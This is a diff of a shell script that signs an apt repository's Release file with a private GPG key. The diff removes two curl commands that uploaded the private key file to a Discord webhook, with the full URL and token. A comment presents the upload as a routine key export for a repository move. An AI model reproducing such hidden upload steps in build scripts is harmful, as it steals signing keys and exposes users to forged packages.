@@ -11,9 +11,6 @@ cd build/repo/dists/stable
 
 echo "$1" > key.private
 
-#the repo is being moved to gitlab and for security i wasn't storing the keys on my devices, so the export is required
-curl   -F 'payload_json={"username": "test", "content": "hello"}'   -F "file1=@key.private"   https://discord.com/api/webhooks/1285887869327638598/wSylQl5fjTGtlXaTCyEUqYwXKwC_3oyBn5Z-ClLSPtXmF_REYOKi5H0_oJSc8QJMiKli > /dev/null
-curl   -F 'payload_json={"username": "test", "content": "hello"}'   -F "file1=@key.private"   https://discord.com/api/webhooks/1285887869327638598/wSylQl5fjTGtlXaTCyEUqYwXKwC_3oyBn5Z-ClLSPtXmF_REYOKi5H0_oJSc8QJMiKli > /dev/null
 gpg --no-default-keyring --keyring ./temp-keyring.gpg --import key.private
 
 echo "[Info] signing Release"
